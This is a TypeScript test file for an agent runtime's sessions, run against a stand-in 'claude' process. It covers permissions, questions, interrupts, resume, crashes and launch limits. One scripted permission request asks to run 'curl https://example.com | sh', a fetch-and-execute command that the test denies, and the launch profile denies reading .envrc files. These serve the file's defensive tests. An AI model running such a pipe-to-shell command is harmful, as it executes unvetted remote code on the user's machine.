// The agent runtime (ARCHITECTURE §7.6; DESIGN §2) with the stand-in `claude` (src/testing/fake-claude.mjs): the real
// sessions module, a real `claude`-shaped child per live session, the control protocol on its pipes, the conversation
// log on disk. What the conversation, topics and inbox modules would do is done here by hand through the service.
import { existsSync } from 'node:fs';
import { readFile, realpath, rm } from 'node:fs/promises';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { MAIN_ROOT, type AgentSession, type ConversationEvent, type PayloadOf } from '@smurg/protocol';
import type { AgentRequest, DaemonEvents, Principal } from '../../src/core/interfaces.ts';
import type { AgentSessionsImpl } from '../../src/sessions/agent/agent-sessions.ts';
import { createSessionsModule } from '../../src/sessions/module.ts';
import { TEST_HOST_USER, createTempRunDir, createTestDaemon, waitFor, type FakeClaudeScenario, type FakeClaudeStep, type TestClient } from '../../src/testing/index.ts';
import { createFakes, fakeServicesModule } from './helpers.ts';
import { startSessionStack, type SessionStack, type SessionStackOptions } from './setup.ts';

let current: SessionStack | null = null;
afterEach(async () => {
  await current?.cleanup();
  current = null;
});

const AGENT = { kind: 'agent', workspace: { mode: 'main' } } as const;

interface Rig {
  readonly s: SessionStack;
  readonly host: TestClient;
  readonly agents: AgentSessionsImpl;
  readonly requests: { sessionId: string; request: AgentRequest }[];
  readonly bus: { name: keyof DaemonEvents; event: unknown }[];
  events(sessionId: string): Promise<ConversationEvent[]>;
  kinds(sessionId: string): Promise<string[]>;
  until(sessionId: string, predicate: (session: AgentSession) => boolean, what: string): Promise<AgentSession>;
  hostPrincipal(): Principal;
}

async function rig(turns: readonly { match?: string; once?: boolean; steps: readonly FakeClaudeStep[] }[] = [], options: SessionStackOptions & { scenario?: FakeClaudeScenario } = {}): Promise<Rig> {
  const s = await startSessionStack({ ...options, scenario: { ...options.scenario, turns } });
  current = s;
  const agents = s.t.ctx.services.agents as AgentSessionsImpl;
  const requests: Rig['requests'] = [];
  const bus: Rig['bus'] = [];
  s.t.ctx.bus.on('agent.request', (event) => requests.push(event));
  for (const name of ['agent.process', 'agent.turn.started', 'agent.turn.finished', 'agent.request.withdrawn', 'agent.ready', 'account.changed', 'session.exited'] as const) {
    s.t.ctx.bus.on(name, (event) => bus.push({ name, event }));
  }
  const events = async (sessionId: string): Promise<ConversationEvent[]> => (await agents.history({ sessionId, afterSeq: 0, limit: 500 })).events;
  const host = await s.t.connectHost();
  return {
    s,
    host,
    agents,
    requests,
    bus,
    events,
    kinds: async (sessionId) => (await events(sessionId)).map((event) => (event.kind === 'line' || event.kind === 'notice' ? `${event.kind}:${event.text.id}` : event.kind === 'delivery' ? `delivery:${event.state}` : event.kind)),
    until: async (sessionId, predicate, what) => {
      await waitFor(() => predicate(agents.get(sessionId) as AgentSession), { timeoutMs: 15_000, what });
      return agents.get(sessionId) as AgentSession;
    },
    hostPrincipal: () => s.t.ctx.members.principalOf(TEST_HOST_USER) as Principal,
  };
}

const idle = (session: AgentSession): boolean => session.status === 'idle';

describe('a free agent session, end to end with the stand-in claude', { timeout: 60_000 }, () => {
  it('session.create { kind: "agent", firstMessage }: the opening line, the message under its header, a turn, the answer; audited; the launch profile and the registration of a free session in the main workspace', async () => {
    const r = await rig([{ steps: [{ text: 'Hello Ian.', deltas: ['Hello ', 'Ian.'] }] }]);
    const host = r.host;
    const states: PayloadOf<'session.state'>['session'][] = [];
    host.conn.on('session.state', (payload) => states.push(payload.session));
    const { session } = await host.conn.request('session.create', { ...AGENT, firstMessage: 'Add a test for the empty cart' });
    expect(session).toMatchObject({ kind: 'agent', purpose: 'free', openedBy: { userId: TEST_HOST_USER }, responsible: null, permissionMode: 'ask-all', modeFixed: false, title: 'Add a test for the empty cart', root: MAIN_ROOT });
    await r.until(session.id, (now) => now.status === 'idle' && now.lastSeq >= 8, 'the first turn to end');
    const events = await r.events(session.id);
    expect(await r.kinds(session.id)).toEqual(['line:conversation.started.free', 'message', 'delivery:queued', 'delivery:started', 'turn.started', 'text', 'turn.finished', 'delivery:completed']);
    expect(events[1]).toMatchObject({ kind: 'message', from: { userId: TEST_HOST_USER, role: 'host' }, text: 'Add a test for the empty cart', origin: 'composer' });
    expect(events[5]).toMatchObject({ kind: 'text', text: 'Hello Ian.', turnId: 't_1' });
    expect(events[6]).toMatchObject({ kind: 'turn.finished', turnId: 't_1', outcome: 'completed' });
    expect(events.map((event) => event.seq)).toEqual([1, 2, 3, 4, 5, 6, 7, 8]);
    // What the agent was told: the header line names who wrote it; no message starts with "/".
    const told = (await r.s.fakeClaude.echoed()).filter((entry) => entry.kind === 'stdin').map((entry) => entry.value as { type: string; message?: { content: { text: string }[] } });
    expect(told.find((line) => line.type === 'user')?.message?.content[0]?.text).toBe('[Host · Host]\nAdd a test for the empty cart');
    // The bus: one process, one turn, with who wrote the message it took.
    expect(r.bus.filter((entry) => entry.name === 'agent.process').map((entry) => (entry.event as DaemonEvents['agent.process']).reason)).toEqual(['started']);
    expect(r.bus.find((entry) => entry.name === 'agent.turn.finished')?.event).toMatchObject({ sessionId: session.id, turnId: 't_1', outcome: 'completed', finalText: 'Hello Ian.', messages: [{ kind: 'person', origin: 'composer', from: { userId: TEST_HOST_USER } }], edited: [] });
    expect(r.bus.find((entry) => entry.name === 'agent.ready')?.event).toMatchObject({ sessionId: session.id, claudeVersion: '2.1.288', login: 'logged-in' });
    // session.state reached the client for the status changes, the last one idle.
    await waitFor(() => states.at(-1)?.kind === 'agent' && states.at(-1)?.status === 'idle', { what: 'session.state idle' });
    expect(states.some((state) => state.kind === 'agent' && state.status === 'running' && state.runningSince !== undefined)).toBe(true);
    // The profile of a free session in the main workspace: Claude Code's default mode, the execution tools, only smurg's MCP server.
    const { profile } = r.s.fakes.hooks.profiles[0] as (typeof r.s.fakes.hooks.profiles)[number];
    expect(profile).toMatchObject({ mode: 'default', strictMcp: true, settingSources: 'all', ask: [], allow: [] });
    expect(profile.tools).toContain('Bash');
    expect(profile.deny.some((rule) => rule.startsWith('Read(//') && rule.endsWith('/.envrc)'))).toBe(true);
    expect(profile.rolePrompt).toMatch(/^You are an agent in a shared smurg workspace/);
    // The audit log: who opened it, and the full text of the message.
    const audit = await r.s.t.ctx.audit.query({ limit: 50 });
    expect(audit.find((entry) => entry.action === 'session.create')?.detail).toMatchObject({ sessionId: session.id, kind: 'agent', purpose: 'free', mode: 'ask-all', root: 'main' });
    expect(audit.find((entry) => entry.action === 'session.message')?.detail).toMatchObject({ sessionId: session.id, origin: 'composer', text: 'Add a test for the empty cart' });
    // The stream flags are the runner's constant; the conversation id is Claude Code's own, not smurg's session id.
    const argv = (await r.s.fakeClaude.echoed()).find((entry) => entry.kind === 'argv')?.value as string[];
    expect(argv.slice(0, 10)).toEqual(['-p', '--output-format', 'stream-json', '--input-format', 'stream-json', '--verbose', '--include-partial-messages', '--replay-user-messages', '--permission-prompt-tool', 'stdio']);
    expect(argv[10]).toBe('--session-id');
    expect(argv[11]).not.toBe(session.id);
    expect(argv).not.toContain('--model');
    expect(argv.join(' ')).not.toMatch(/dangerously|bypass/);
  });

  it("an agent session an Agent access member opens is launched exactly like the host's, and is attributed to her: `Claude (Carol)`; her agent's path rights stay a member's", async () => {
    const r = await rig([{ steps: [{ tool: 'Bash', input: { command: 'printf \'%s\\n%s\\n\' "$HOME" "$(pwd -P)" > "agent-env.$SMURG_SESSION_ID"' }, run: true, ask: false }, { text: 'done' }] }]);
    const carol = await r.s.t.connect({ userId: 'dev:carol', displayName: 'Carol', role: 'agent' });
    const hosts = (await r.host.conn.request('session.create', { ...AGENT, firstMessage: 'hello' })).session;
    const hers = (await carol.conn.request('session.create', { ...AGENT, firstMessage: 'hello' })).session;
    for (const id of [hosts.id, hers.id]) await r.until(id, (now) => now.status === 'idle' && now.lastSeq >= 10, 'the first turn');
    expect(hers).toMatchObject({ kind: 'agent', purpose: 'free', openedBy: { userId: 'dev:carol', displayName: 'Carol' }, permissionMode: 'ask-all', root: MAIN_ROOT });
    // The same process: the host's HOME, the shared folder as its working directory (no guest directory, no sandbox).
    const root = await realpath(r.s.t.root);
    for (const id of [hosts.id, hers.id]) expect((await readFile(join(r.s.t.root, `agent-env.${id}`), 'utf8')).split('\n').slice(0, 2), id).toEqual([r.s.hostHome, root]);
    // The same command line (the conversation id and the launch directory are each session's own) and the same settings file.
    const echoed = await r.s.fakeClaude.echoed();
    const launchOf = (sessionId: string): { flags: string[]; tools: string; mode: string; settings: unknown } => {
      const argv = echoed.find((entry) => entry.kind === 'argv' && entry.session === sessionId)?.value as string[];
      return {
        flags: argv.filter((arg) => arg.startsWith('-')),
        tools: argv[argv.indexOf('--tools') + 1] as string,
        mode: argv[argv.indexOf('--permission-mode') + 1] as string,
        settings: echoed.find((entry) => entry.kind === 'settings' && entry.session === sessionId)?.value,
      };
    };
    expect(launchOf(hers.id)).toEqual(launchOf(hosts.id));
    expect(launchOf(hers.id).flags).toContain('--strict-mcp-config');
    const profileOf = (sessionId: string): Record<string, unknown> => {
      const { rolePrompt: _rolePrompt, ...rest } = r.s.fakes.hooks.profiles.find((entry) => entry.sessionId === sessionId)?.profile as (typeof r.s.fakes.hooks.profiles)[number]['profile'];
      return rest;
    };
    expect(profileOf(hers.id)).toEqual(profileOf(hosts.id));
    // Attributed to her: the name in locks, presence, the activity feed and the audit log; whose locks they are; and
    // what her agent may write is a member's (the host's own agent has the host's rights).
    expect(r.s.fakes.hooks.registered.get(hers.id)).toMatchObject({ purpose: 'free', ownerUserId: 'dev:carol', agentName: 'Claude (Carol)', pathRights: 'member', root: MAIN_ROOT });
    expect(r.s.fakes.hooks.registered.get(hosts.id)).toMatchObject({ purpose: 'free', ownerUserId: TEST_HOST_USER, agentName: 'Claude (Host)', pathRights: 'host' });
    expect(r.s.sessions.agentActor(hers.id)).toEqual({ kind: 'agent', sessionId: hers.id, ownerUserId: 'dev:carol', displayName: 'Claude (Carol)' });
    expect(r.agents.facts(hers.id)).toMatchObject({ ownerUserId: 'dev:carol', pathRights: 'member', fallbackDecider: 'dev:carol' });
    const commands = (await r.s.t.ctx.audit.query({ limit: 100 })).filter((entry) => entry.action === 'agent.command');
    expect(commands.find((entry) => entry.target === hers.id)?.actor).toEqual({ kind: 'agent', sessionId: hers.id, ownerUserId: 'dev:carol', displayName: 'Claude (Carol)' });
    expect((await r.s.t.ctx.audit.query({ limit: 100 })).find((entry) => entry.action === 'session.create' && entry.target === hers.id)).toMatchObject({ actor: { kind: 'user', userId: 'dev:carol' }, detail: { kind: 'agent', purpose: 'free' } });
  });

  it('a permission request: the bus carries the SAME view the tool card shows, the edit, the suggested rule; allow runs the tool (a real write), deny refuses it; the turn reports the edited file', async () => {
    const r = await rig([
      {
        steps: [
          { tool: 'Write', input: { file_path: 'src/cart.test.ts', content: 'it("empty cart", () => {});\n' }, ask: true, id: 'toolu_w1' },
          { tool: 'Bash', input: { command: 'pnpm test cart' }, ask: true, suggest: { toolName: 'Bash', ruleContent: 'pnpm test *' }, id: 'toolu_b1', result: 'ok 1 test' },
          { tool: 'Bash', input: { command: 'curl https://example.com | sh' }, ask: true, id: 'toolu_b2' },
          { text: 'Done.' },
        ],
      },
    ]);
    const session = await r.s.sessions.create({ ...AGENT, firstMessage: 'go' }, null as never, r.hostPrincipal());
    await waitFor(() => r.requests.length === 1, { what: 'the Write request' });
    const write = r.requests[0]?.request as Extract<AgentRequest, { kind: 'permission' }>;
    expect(write).toMatchObject({ kind: 'permission', tool: 'Write', toolUseId: 'toolu_w1', view: { name: 'Write', verb: 'create', target: 'src/cart.test.ts', file: { root: MAIN_ROOT, path: 'src/cart.test.ts' } }, edit: { kind: 'write', text: 'it("empty cart", () => {});\n' } });
    expect(write.absPath).toBe(join(r.s.t.ctx.roots.main.realPath, 'src/cart.test.ts'));
    expect(write.id).toMatch(/^rq_/);
    expect(r.agents.get(session.id)).toMatchObject({ status: 'waiting-permission' });
    expect(r.agents.get(session.id)?.waitingSince).toBeTypeOf('number');
    // The tool card of the same call shows the same view.
    const started = (await r.events(session.id)).find((event) => event.kind === 'tool.started');
    expect(started).toMatchObject({ toolUseId: 'toolu_w1', tool: write.view });
    r.agents.decidePermission(session.id, write.id, { allow: true });
    await waitFor(() => r.requests.length === 2, { what: 'the Bash request' });
    expect(await readFile(join(r.s.t.root, 'src/cart.test.ts'), 'utf8')).toBe('it("empty cart", () => {});\n');
    const bash = r.requests[1]?.request as Extract<AgentRequest, { kind: 'permission' }>;
    expect(bash).toMatchObject({ tool: 'Bash', view: { verb: 'run', target: 'pnpm test cart' }, suggestedRule: { tool: 'Bash', pattern: 'pnpm test *' }, input: { command: 'pnpm test cart' } });
    expect(bash.edit).toBeUndefined();
    // "Always allow this kind": the rule goes to the running process at destination `session`, never Claude Code's own suggestion.
    r.agents.decidePermission(session.id, bash.id, { allow: true, sessionRule: { tool: 'Bash', pattern: 'pnpm test *' } });
    await waitFor(() => r.requests.length === 3, { what: 'the curl request' });
    const curl = r.requests[2]?.request as Extract<AgentRequest, { kind: 'permission' }>;
    r.agents.decidePermission(session.id, curl.id, { allow: false, message: 'Not that.' });
    // A request answered twice, or one that never existed, is a conflict.
    expect(() => r.agents.decidePermission(session.id, curl.id, { allow: true })).toThrowError(expect.objectContaining({ code: 'conflict' }));
    await r.until(session.id, idle, 'the turn to end');
    const events = await r.events(session.id);
    const finished = events.filter((event) => event.kind === 'tool.finished');
    expect(finished[0]).toMatchObject({ toolUseId: 'toolu_w1', turnId: 't_1', ok: true, result: { additions: 1, deletions: 0, body: { kind: 'diff', text: '+it("empty cart", () => {});\n', truncated: false } } });
    expect(finished[1]).toMatchObject({ toolUseId: 'toolu_b1', ok: true, result: { exitCode: 0, body: { kind: 'output', text: 'ok 1 test' } } });
    expect(finished[2]).toMatchObject({ toolUseId: 'toolu_b2', ok: false });
    const turn = r.bus.find((entry) => entry.name === 'agent.turn.finished')?.event as DaemonEvents['agent.turn.finished'];
    expect(turn.edited).toEqual([{ file: { root: MAIN_ROOT, path: 'src/cart.test.ts' }, seq: started?.seq }]);
    expect(turn.finalText).toBe('Done.');
    const stdin = (await r.s.fakeClaude.echoed()).filter((entry) => entry.kind === 'stdin').map((entry) => entry.value as { type: string; response?: { response?: Record<string, unknown> } });
    const answers = stdin.filter((line) => line.type === 'control_response').map((line) => line.response?.response);
    expect(answers[1]).toMatchObject({ behavior: 'allow', updatedPermissions: [{ type: 'addRules', rules: [{ toolName: 'Bash', ruleContent: 'pnpm test *' }], behavior: 'allow', destination: 'session' }] });
    expect(JSON.stringify(answers)).not.toContain('localSettings');
    expect(answers[2]).toEqual({ behavior: 'deny', message: 'Not that.' });
    // The command a member allowed is audited with that decision.
    const audit = await r.s.t.ctx.audit.query({ limit: 50 });
    expect(audit.find((entry) => entry.action === 'agent.command')).toMatchObject({ actor: { kind: 'agent', sessionId: session.id, displayName: 'Claude (Host)' }, detail: { verb: 'run', why: `decision:${bash.id}`, command: 'pnpm test cart' } });
  });

  it('AskUserQuestion becomes a question request (never a tool card); the answer goes back keyed by the question texts with the notes; a question the wire cannot carry is refused towards the agent with no event', async () => {
    const question = { question: 'Which database?', header: 'Database', multiSelect: false, options: [{ label: 'SQLite', description: 'One file' }, { label: 'Postgres', description: 'A server' }] };
    const tooMany = { ...question, options: ['a', 'b', 'c', 'd', 'e'].map((label) => ({ label, description: label })) };
    const r = await rig([
      { steps: [{ tool: 'AskUserQuestion', input: { questions: [tooMany] }, id: 'toolu_q0' }, { tool: 'AskUserQuestion', input: { questions: [question, { ...question, question: 'Which platforms?', header: 'Platforms', multiSelect: true }] }, id: 'toolu_q1' }, { text: 'Thanks.' }] },
    ]);
    const session = await r.s.sessions.create({ ...AGENT, firstMessage: 'decide' }, null as never, r.hostPrincipal());
    await waitFor(() => r.requests.length === 1, { what: 'the question' });
    const asked = r.requests[0]?.request as Extract<AgentRequest, { kind: 'question' }>;
    expect(asked).toMatchObject({ kind: 'question', toolUseId: 'toolu_q1', parts: [{ header: 'Database', text: 'Which database?', multi: false, options: [{ label: 'SQLite', description: 'One file' }, { label: 'Postgres', description: 'A server' }] }, { header: 'Platforms', text: 'Which platforms?', multi: true }] });
    expect(r.agents.get(session.id)?.status).toBe('waiting-answer');
    r.agents.answerQuestion(session.id, asked.id, { answers: { 'Which database?': 'SQLite', 'Which platforms?': 'SQLite, Postgres' }, notes: { 'Which database?': '3 of 4 voted SQLite' } });
    await r.until(session.id, idle, 'the turn to end');
    const events = await r.events(session.id);
    expect(events.filter((event) => event.kind === 'tool.started' || event.kind === 'tool.finished')).toEqual([]);
    const stdin = (await r.s.fakeClaude.echoed()).filter((entry) => entry.kind === 'stdin').map((entry) => entry.value as { type: string; response?: { response?: Record<string, unknown> } });
    const answers = stdin.filter((line) => line.type === 'control_response').map((line) => line.response?.response);
    expect(answers[0]).toMatchObject({ behavior: 'deny' });
    expect(String(answers[0]?.['message'])).toMatch(/smurg cannot show this question/);
    expect(answers[1]).toMatchObject({ behavior: 'allow', updatedInput: { answers: { 'Which database?': 'SQLite', 'Which platforms?': 'SQLite, Postgres' }, annotations: { 'Which database?': { notes: '3 of 4 voted SQLite' } } } });
  });

  it('"Stop": the line, the turn ends interrupted with who stopped it, the open request is withdrawn with them; the session stays usable', async () => {
    const r = await rig([{ match: 'long', steps: [{ tool: 'Bash', input: { command: 'make all' }, ask: true }, { wait: 'interrupt' }] }]);
    const session = await r.s.sessions.create({ ...AGENT, firstMessage: 'a long task' }, null as never, r.hostPrincipal());
    await waitFor(() => r.requests.length === 1, { what: 'the request' });
    const by = { userId: TEST_HOST_USER, displayName: 'Host' };
    await r.agents.interrupt(session.id, { kind: 'user', ...by });
    await r.until(session.id, idle, 'the turn to end');
    expect(r.bus.find((entry) => entry.name === 'agent.request.withdrawn')?.event).toEqual({ sessionId: session.id, requestId: r.requests[0]?.request.id, reason: 'stopped', by });
    expect(r.bus.find((entry) => entry.name === 'agent.turn.finished')?.event).toMatchObject({ outcome: 'interrupted', stoppedBy: by });
    const kinds = await r.kinds(session.id);
    expect(kinds).toContain('line:conversation.stopped');
    const before = r.agents.get(session.id)?.lastSeq ?? 0;
    expect((await r.events(session.id)).find((event) => event.kind === 'turn.finished')).toMatchObject({ outcome: 'interrupted', stoppedBy: by });
    expect(() => r.agents.decidePermission(session.id, r.requests[0]?.request.id as string, { allow: true })).toThrowError(expect.objectContaining({ code: 'conflict' }));
    // The next message is a new turn of the same process.
    await r.agents.send(session.id, { kind: 'person', from: r.hostPrincipal(), text: 'thanks', cleaned: false, origin: 'composer' });
    await r.until(session.id, (now) => now.status === 'idle' && now.lastSeq >= before + 6, 'the second turn');
    expect((await r.events(session.id)).filter((event) => event.kind === 'turn.finished').map((event) => (event.kind === 'turn.finished' ? event.outcome : ''))).toEqual(['interrupted', 'completed']);
    expect((await r.s.t.ctx.audit.query({ limit: 50 })).some((entry) => entry.action === 'session.interrupt')).toBe(true);
  });
});

describe('processes: parking, resume, failure, retry, the daemon stopping', { timeout: 90_000 }, () => {
  it('an idle session gives up its process after parkAfterMs (it stays idle); the next message starts a new process with --resume and the conversation goes on', async () => {
    const r = await rig([], { daemon: { agents: { parkAfterMs: 1_000, escalationSweepMs: 20 } } });
    const session = await r.s.sessions.create({ ...AGENT, firstMessage: 'one' }, null as never, r.hostPrincipal());
    await r.until(session.id, (now) => now.status === 'idle' && now.lastSeq >= 8, 'the first turn');
    expect(r.agents.facts(session.id)?.hasProcess).toBe(true);
    r.s.t.advanceClock(2_000);
    await waitFor(() => r.agents.facts(session.id)?.hasProcess === false, { timeoutMs: 10_000, what: 'the process to be parked' });
    expect(r.agents.get(session.id)?.status).toBe('idle');
    expect(r.s.fakes.hooks.unregistered).toContain(session.id);
    const sent = await r.agents.send(session.id, { kind: 'person', from: r.hostPrincipal(), text: 'two', cleaned: false, origin: 'composer' });
    await r.until(session.id, (now) => now.status === 'idle' && now.lastSeq >= sent.seq + 6, 'the second turn');
    expect(r.bus.filter((entry) => entry.name === 'agent.process').map((entry) => (entry.event as DaemonEvents['agent.process']).reason)).toEqual(['started', 'parked', 'started']);
    const argvs = (await r.s.fakeClaude.echoed()).filter((entry) => entry.kind === 'argv').map((entry) => entry.value as string[]);
    expect(argvs).toHaveLength(2);
    expect(argvs[0]).toContain('--session-id');
    expect(argvs[1]).toContain('--resume');
    expect(argvs[1]?.[argvs[1].indexOf('--resume') + 1]).toBe(argvs[0]?.[argvs[0].indexOf('--session-id') + 1]);
    const events = await r.events(session.id);
    expect(events.filter((event) => event.kind === 'turn.started').map((event) => (event.kind === 'turn.started' ? event.turnId : ''))).toEqual(['t_1', 't_2']);
    expect(events.filter((event) => event.kind === 'delivery' && event.messageId === sent.messageId).map((event) => (event.kind === 'delivery' ? event.state : ''))).toEqual(['queued', 'started', 'completed']);
  });

  it('a process that dies is a failed session with a notice and withdrawn requests; "Try again" resumes it; after three failed starts only the host may retry', async () => {
    const r = await rig([
      { match: 'crash', once: true, steps: [{ tool: 'Bash', input: { command: 'make' }, ask: true }] },
      { match: 'die', steps: [{ exit: 3, stderr: 'boom' }] },
    ]);
    const mei = await r.s.t.connect({ userId: 'dev:mei', displayName: 'Mei', role: 'agent' });
    const { session } = await mei.conn.request('session.create', { ...AGENT, firstMessage: 'crash now' });
    await waitFor(() => r.requests.length === 1, { what: 'the request' });
    // The process is killed from outside while it waits for a permission.
    const pid = r.agents.liveChildren().find((child) => child.id === session.id)?.pid as number;
    process.kill(pid, 'SIGKILL');
    const failed = await r.until(session.id, (now) => now.status === 'failed', 'the failure');
    expect(failed.retryHostOnly).toBeUndefined();
    expect(r.bus.find((entry) => entry.name === 'agent.request.withdrawn')?.event).toEqual({ sessionId: session.id, requestId: r.requests[0]?.request.id, reason: 'failed' });
    expect(r.bus.filter((entry) => entry.name === 'agent.process').map((entry) => (entry.event as DaemonEvents['agent.process']).reason)).toEqual(['started', 'failed']);
    const events = await r.events(session.id);
    expect(events.at(-1)).toMatchObject({ kind: 'notice', level: 'error', text: { id: 'notice.processExited' }, action: 'retry' });
    expect(events.find((event) => event.kind === 'turn.finished')).toMatchObject({ outcome: 'error' });
    // Not failed: nothing to retry.
    const other = await mei.conn.request('session.create', AGENT);
    await expect(mei.conn.request('session.retry', { sessionId: other.session.id })).rejects.toMatchObject({ code: 'conflict', detail: { reason: 'not-failed' } });
    // "Try again": the line, a new process; the conversation that Claude Code already has is resumed.
    const retried = await mei.conn.request('session.retry', { sessionId: session.id });
    expect(retried.session.status).toBe('starting');
    await r.until(session.id, idle, 'the retry');
    expect(await r.kinds(session.id)).toContain('line:conversation.retry.resumed');
    // Starts that fail before any turn of theirs ended: after three in a row only the host may try again.
    for (let i = 0; i < 3; i++) {
      await r.agents.send(session.id, { kind: 'smurg', purpose: 'continue-item', text: 'die' });
      await r.until(session.id, (now) => now.status === 'failed', `failure ${i + 1}`);
      if (i === 2) break;
      await r.agents.retry(session.id, r.hostPrincipal());
      await r.until(session.id, idle, 'the retry');
    }
    expect(r.agents.get(session.id)).toMatchObject({ status: 'failed', retryHostOnly: true });
    await expect(mei.conn.request('session.retry', { sessionId: session.id })).rejects.toMatchObject({ code: 'forbidden', text: { id: 'session.retry.hostOnly' }, detail: { reason: 'host-only' } });
    await expect(r.host.conn.request('session.retry', { sessionId: session.id })).resolves.toBeDefined();
    await r.until(session.id, idle, "the host's retry");
    expect((await r.s.t.ctx.audit.query({ limit: 100 })).filter((entry) => entry.action === 'session.retry').length).toBeGreaterThanOrEqual(2);
  });

  it('a daemon stop ends every agent process but keeps the session: after a restart it is idle, readable, and the next message resumes it', async () => {
    const stateDir = await createTempRunDir();
    try {
      const r = await rig([{ match: 'wait', steps: [{ text: 'Working.' }, { wait: 'interrupt' }] }], { daemon: { stateDir } });
      const session = await r.s.sessions.create({ ...AGENT, firstMessage: 'wait for me' }, null as never, r.hostPrincipal());
      await r.until(session.id, (now) => now.status === 'running' && now.lastSeq >= 6, 'the turn to run');
      const pid = r.agents.liveChildren()[0]?.pid as number;
      r.host.close();
      await r.s.t.daemon.stop();
      expect(() => process.kill(pid, 0)).toThrow();
      // The same state directory and folder, a new daemon.
      const selfCommand = { file: '/usr/bin/true', args: [] };
      const again = await createTestDaemon({
        root: r.s.t.root,
        stateDir,
        workspaceId: r.s.t.workspaceId,
        modules: [fakeServicesModule(createFakes()), createSessionsModule({ hostEnv: () => ({ PATH: '/usr/bin:/bin', HOME: r.s.hostHome, ...r.s.fakeClaude.env }), hostShell: '/bin/sh', launch: { claudePath: r.s.fakeClaude.path, selfCommand } })],
        sessions: { selfCommand, hostHome: r.s.hostHome },
      });
      try {
        const agents = again.ctx.services.agents as AgentSessionsImpl;
        expect(agents.get(session.id)).toMatchObject({ status: 'idle', purpose: 'free', title: 'wait for me' });
        expect(agents.facts(session.id)?.hasProcess).toBe(false);
        const before = (await agents.history({ sessionId: session.id, afterSeq: 0, limit: 500 })).events;
        expect(before.map((event) => (event.kind === 'line' ? event.text.id : event.kind))).toEqual(expect.arrayContaining(['conversation.started.free', 'turn.finished', 'conversation.interrupted.restart']));
        expect(before.find((event) => event.kind === 'turn.finished')).toMatchObject({ outcome: 'interrupted' });
        const host = await again.connectHost();
        const { messageId } = await host.conn.request('session.list', {}).then(async () => agents.send(session.id, { kind: 'person', from: again.ctx.members.principalOf(TEST_HOST_USER) as Principal, text: 'and now?', cleaned: false, origin: 'composer' }));
        expect(messageId).toMatch(/^m_/);
        await waitFor(() => agents.get(session.id)?.status === 'idle' && (agents.get(session.id)?.lastSeq ?? 0) >= before.length + 7, { timeoutMs: 15_000, what: 'the resumed turn' });
        const after = (await agents.history({ sessionId: session.id, afterSeq: before.length, limit: 500 })).events;
        expect(after.find((event) => event.kind === 'turn.started')).toMatchObject({ turnId: 't_2' });
        expect(after.find((event) => event.kind === 'text')).toMatchObject({ text: 'ok' });
      } finally {
        await again.cleanup();
      }
    } finally {
      await rm(stateDir, { recursive: true, force: true });
    }
  }, 60_000);
});

describe('refusals before a start, and the limits', { timeout: 60_000 }, () => {
  it('Claude Code older than the floor, a logged-out host, no claude at all, the session limit: refused with their own sentence, nothing is created', async () => {
    const old = await rig([], { claudeVersion: '2.1.200' });
    const host = old.host;
    await expect(host.conn.request('session.create', AGENT)).rejects.toMatchObject({ code: 'conflict', text: { id: 'session.claude.tooOld', params: { found: '2.1.200' } }, detail: { reason: 'claude-too-old' } });
    expect(old.agents.list()).toEqual([]);
    expect(old.s.fakes.activity.notifications.map((n) => n.msg?.id)).toContain('notify.claudeVersionTooOld');
    await old.s.cleanup();
    current = null;

    const out = await rig([], { scenario: { loggedIn: false } });
    const host2 = out.host;
    await expect(host2.conn.request('session.create', AGENT)).rejects.toMatchObject({ code: 'conflict', text: { id: 'session.claude.notLoggedIn' } });
    expect(out.agents.account()).toMatchObject({ state: 'logged-out' });
    expect(out.agents.attention()).toMatchObject([{ subject: 'account', recipients: [TEST_HOST_USER], target: { kind: 'console', section: 'sessions' } }]);
    await out.s.cleanup();
    current = null;

    const none = await rig([], { claudePath: '/nonexistent/claude' });
    const host3 = none.host;
    await expect(host3.conn.request('session.create', AGENT)).rejects.toMatchObject({ code: 'conflict', text: { id: 'session.claudeNotFound' } });
    await none.s.cleanup();
    current = null;

    const few = await rig([], { daemon: { agents: { maxAgentSessions: 1 } } });
    const host4 = few.host;
    const first = await host4.conn.request('session.create', AGENT);
    await expect(host4.conn.request('session.create', AGENT)).rejects.toMatchObject({ code: 'conflict', text: { id: 'session.limit.agents', params: { max: 1 } } });
    // An ended session no longer counts.
    await host4.conn.request('session.end', { sessionId: first.session.id });
    await expect(host4.conn.request('session.create', AGENT)).resolves.toBeDefined();
  });

  it('beyond maxAgentProcesses the longest-idle session is parked first; when none is idle the start is refused', async () => {
    const r = await rig([{ match: 'hold', steps: [{ wait: 'interrupt' }] }], { daemon: { agents: { maxAgentProcesses: 1 } } });
    const host = r.host;
    const a = await host.conn.request('session.create', { ...AGENT, firstMessage: 'quick' });
    await r.until(a.session.id, (now) => now.status === 'idle' && now.lastSeq >= 8, 'a to be idle');
    const b = await host.conn.request('session.create', { ...AGENT, firstMessage: 'hold on' });
    expect(r.agents.facts(a.session.id)?.hasProcess).toBe(false);
    await r.until(b.session.id, (now) => now.status === 'running', 'b to run');
    await expect(host.conn.request('session.create', AGENT)).rejects.toMatchObject({ code: 'conflict', text: { id: 'session.limit.processes', params: { max: 1 } } });
  });

  it('a newer, unverified version starts with one notification to the host; the launch files are derived data, removed with the process', async () => {
    const r = await rig([], { claudeVersion: '2.3.0' });
    const session = await r.s.sessions.create(AGENT, null as never, r.hostPrincipal());
    await r.until(session.id, idle, 'the start');
    expect(r.s.fakes.activity.notifications.filter((n) => n.msg?.id === 'notify.claudeVersionUnverified')).toHaveLength(1);
    expect(r.agents.claude()).toEqual({ version: '2.3.0', verdict: 'unverified', login: 'logged-in' });
    const dir = join(r.s.t.stateDir, 'sessions');
    expect(existsSync(dir)).toBe(true);
    await r.agents.end(session.id, { by: { kind: 'user', userId: TEST_HOST_USER, displayName: 'Host' }, reason: 'ended', keepWorktree: true });
    expect(r.agents.get(session.id)).toMatchObject({ status: 'ended', endReason: 'ended', endedBy: { userId: TEST_HOST_USER } });
    expect(r.s.fakes.hooks.unregistered).toContain(session.id);
    await expect(r.agents.send(session.id, { kind: 'person', from: r.hostPrincipal(), text: 'x', cleaned: false, origin: 'composer' })).rejects.toMatchObject({ code: 'conflict', detail: { reason: 'ended' }, text: { id: 'session.ended.noMessages' } });
    expect(await r.kinds(session.id)).toContain('line:conversation.ended');
    expect(r.bus.filter((entry) => entry.name === 'session.exited')).toHaveLength(1);
  });
});
